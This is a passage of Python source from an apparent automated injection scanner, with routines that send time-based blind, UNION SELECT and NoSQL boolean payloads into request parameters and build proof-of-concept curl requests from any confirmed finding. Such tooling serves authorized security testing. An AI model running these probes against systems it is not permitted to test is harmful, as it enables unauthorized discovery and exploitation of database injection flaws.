            payload = tpl.format(s=sleep_s)
            ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + payload,
            )
            ex.expected_sleep_ms = self._sleep_ms
            report.add_request()
            delay = ex.response_time_ms - baseline.response_time_ms
            if delay < thresh:
                continue
            # Confirm: sleep(0) control must be fast.
            ctrl_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + ctrl_tpl,
            )
            report.add_request()
            ctrl_delay = ctrl_ex.response_time_ms - baseline.response_time_ms
            if ctrl_delay < thresh * 0.6:
                return self._build_finding(
                    point, ex, baseline,
                    f"Time-based blind: {payload!r} delayed response +{delay:.0f}ms "
                    f"(~{sleep_s}s); control sleep(0) returned fast (+{ctrl_delay:.0f}ms)",
                    0.9, inj_type=InjectionType.TIME_BLIND,
                )
        return None

    def _test_union(
        self, url, method, data, content_type, extra_headers, point, baseline, report,
    ) -> Optional[Finding]:
        """UNION-based detection via a reflected marker.

        Appends ``UNION SELECT '<marker>',...`` with a distinctive marker in
        every column, trying a few boundary contexts and column counts. If the
        marker shows up in the response, the query executed our UNION and echoed
        our data — an unambiguous UNION SQLi (and it tells us the column count).
        Low false-positive by construction: a random marker only appears if the
        injection actually worked.
        """
        if self.fast:
            return None
        marker = "qLmSqLu9182x"
        if marker in (baseline.response_body or ""):
            return None
        orig = point.original_value or ""
        # Common query contexts: string-quoted, numeric, double-quoted.
        boundaries = ["'", "", '"']
        max_cols = 5
        for prefix in boundaries:
            for n in range(1, max_cols + 1):
                cols = ",".join(["'%s'" % marker] * n)
                payload = "%s%s UNION SELECT %s-- -" % (orig, prefix, cols)
                ex = self.probe.send(
                    url, method, data, content_type, extra_headers,
                    inject_point=point, payload=payload,
                )
                report.add_request()
                if marker in (ex.response_body or ""):
                    ev = ("UNION-based SQLi: injected marker reflected "
                          "(%d column(s), boundary %r)" % (n, prefix or "numeric"))
                    return self._build_finding(
                        point, ex, baseline, ev, 0.95,
                        inj_type=InjectionType.UNION_BASED,
                    )
        return None

    def _test_nosql(
        self, url, method, data, content_type, extra_headers, point, baseline, report
    ) -> Optional[Finding]:
        """
        NoSQL (MongoDB/MarsDB) injection test — sqlmap doesn't cover NoSQL.
        Sends boolean true/false pairs (' || '1'=='1' vs '2') and looks for a
        response differential or an explicit NoSQL driver error.
        """
        from llmsql.payloads import NOSQL_PAIRS
        if self.fast or not (200 <= baseline.status_code < 300):
            return None
        # Skip non-deterministic endpoints (captcha/random/timestamps) — their
        # true/false diff is noise, not a NoSQL boolean signal.
        if self._natural_variance(
            url, method, data, content_type, extra_headers, point, baseline, report
        ) > 0.15:
            return None
        orig = point.original_value or ""
        for true_pl, false_pl in NOSQL_PAIRS[:3]:
            true_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + true_pl,
            )
            false_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + false_pl,
            )
            report.add_request()
            report.add_request()
            nerr = (self.detector.find_nosql_errors(true_ex.response_body)
                    or self.detector.find_nosql_errors(false_ex.response_body))
            if nerr:
                return self._build_finding(
                    point, true_ex, baseline,
                    f"NoSQL error: {nerr[0][:80]}", 0.85,
                    inj_type=InjectionType.NOSQL,
                )
            score, evidence = self.detector.nosql_boolean_score(
                baseline, true_ex, false_ex
            )
            if score >= 0.8:
                return self._build_finding(
                    point, true_ex, baseline, evidence, score,
                    inj_type=InjectionType.NOSQL,
                )
        return None

    def _build_finding(
        self,
        point: InjectionPoint,
        injected: HttpExchange,
        baseline: HttpExchange,
        evidence: str,
        confidence: float,
        db_hint: Optional[str] = None,
        inj_type: Optional[InjectionType] = None,
    ) -> Finding:
        # A 404 (route-not-found) response is never a SQLi confirmation. Many
        # apps echo the payload back in a "Cannot GET /<payload>" body, which
        # can spuriously match a SQL-error regex (e.g. a reflected
        # `sqlite_version()` next to a JSON "error" key). The query never ran.
        if injected.status_code == 404:
            return None

        # PATH injection: changing a path segment almost always changes the HTTP
        # response (different route, 404, etc.) — that alone is NOT SQLi.
        # Require actual SQL error text for path-segment findings, UNLESS this is
        # a NoSQL finding (confirmed separately via boolean differential/error).
        if point.location.value == "path" and inj_type != InjectionType.NOSQL:
            if not self.detector.find_sql_errors(injected.response_body):
                return None

        db = db_hint or self.detector.guess_db_from_errors(injected.response_body)
        itype = inj_type or self.detector.infer_injection_type(baseline, injected, evidence)
        severity = Severity.HIGH if confidence >= 0.8 else Severity.MEDIUM
        poc_curl, poc_req = _build_poc(injected)

        def _snippet(ex: HttpExchange) -> str:
            body = (ex.response_body or "").strip().replace("\r", "")
            return f"HTTP {ex.status_code}\n{body[:600]}"

        return Finding(
            param=point.name,
            location=point.location,
            injection_type=itype,
            severity=severity,
            payload=injected.payload or "",
            evidence=evidence,
            confidence=confidence,
            db_type=db,
            poc_curl=poc_curl,
            poc_request=poc_req,
            response_before=_snippet(baseline),
            response_after=_snippet(injected),
            payload_url=injected.url or "",
        )

    @staticmethod
    def _is_blocked(baseline: HttpExchange, injected: HttpExchange) -> bool:
        """Payload refused by a WAF/filter while the endpoint itself is live."""
        block_codes = {403, 406, 429, 501, 999}
        return (
            baseline.status_code not in block_codes
            and 200 <= baseline.status_code < 400
            and injected.status_code in block_codes
        )

    @staticmethod
    def _map_severity(s: str) -> Severity:
        try:
            return Severity(s.lower())
        except ValueError:
            return Severity.MEDIUM
